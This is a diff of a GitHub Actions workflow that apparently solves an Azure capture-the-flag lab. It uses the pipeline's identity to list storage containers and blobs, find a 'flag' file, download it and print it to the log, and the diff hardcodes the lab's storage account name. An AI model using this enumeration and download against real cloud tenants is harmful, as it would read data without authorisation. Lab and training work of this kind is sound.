@@ -29,24 +29,15 @@ jobs:
           echo "==== whoami (graph) ===="
           az rest --method GET --uri https://graph.microsoft.com/v1.0/me || true
 
-      # 既に BLOB が分かっているなら、次の「列挙」をスキップして直接 download へ
       - name: List containers (to locate the flag)
         run: |
-          az storage container list \
-            --account-name "${{ secrets.STORAGE_ACCOUNT }}" \
-            --auth-mode login -o table
+          az storage container list --account-name "iamazurelab2bd9fdeb3" --auth-mode login -o table
 
       - name: List blobs in likely containers
-        if: ${{ !secrets.CONTAINER }}
         run: |
-          # よくある flag 名の候補やテキスト系を手広く当てる例
-          for c in $(az storage container list --account-name "${{ secrets.STORAGE_ACCOUNT }}" --auth-mode login --query "[].name" -o tsv); do
+          for c in $(az storage container list --account-name "iamazurelab2bd9fdeb3" --auth-mode login --query "[].name" -o tsv); do
             echo "== Container: $c =="
-            az storage blob list \
-              --account-name "${{ secrets.STORAGE_ACCOUNT }}" \
-              --container-name "$c" \
-              --auth-mode login \
-              --query "[?contains(name, 'flag') || ends_with(name, '.txt')].name" -o tsv
+            az storage blob list --account-name "iamazurelab2bd9fdeb3" --container-name "$c" --auth-mode login --query "[?contains(name, 'flag') || ends_with(name, '.txt')].name" -o tsv
           done
 
       - name: Download flag (explicit names or first match)
@@ -54,21 +45,15 @@ jobs:
           CONTAINER="${{ secrets.CONTAINER }}"
           BLOB="${{ secrets.BLOB }}"
           if [ -z "$CONTAINER" ] || [ -z "$BLOB" ]; then
-            # 最初に見つかった "flag" を含む blob を拾う簡易ロジック
-            CONTAINER=$(az storage container list --account-name "${{ secrets.STORAGE_ACCOUNT }}" --auth-mode login --query "[].name" -o tsv | head -n1)
-            BLOB=$(az storage blob list --account-name "${{ secrets.STORAGE_ACCOUNT }}" --container-name "$CONTAINER" --auth-mode login --query "[?contains(name, 'flag')].name" -o tsv | head -n1)
+            CONTAINER=$(az storage container list --account-name "iamazurelab2bd9fdeb3" --auth-mode login --query "[].name" -o tsv | head -n1)
+            BLOB=$(az storage blob list --account-name "iamazurelab2bd9fdeb3" --container-name "$CONTAINER" --auth-mode login --query "[?contains(name, 'flag')].name" -o tsv | head -n1)
           fi
           echo "Target: container=$CONTAINER blob=$BLOB"
           if [ -z "$CONTAINER" ] || [ -z "$BLOB" ]; then
             echo "Flag blob not found." && exit 1
           fi
 
-          az storage blob download \
-            --account-name "${{ secrets.STORAGE_ACCOUNT }}" \
-            --container-name "$CONTAINER" \
-            --name "$BLOB" \
-            --file "flag.txt" \
-            --auth-mode login
+          az storage blob download --account-name "iamazurelab2bd9fdeb3" --container-name "$CONTAINER" --name "$BLOB" --file "flag.txt" --auth-mode login
           echo "===== FLAG ====="
           cat flag.txt
           echo "=============== "
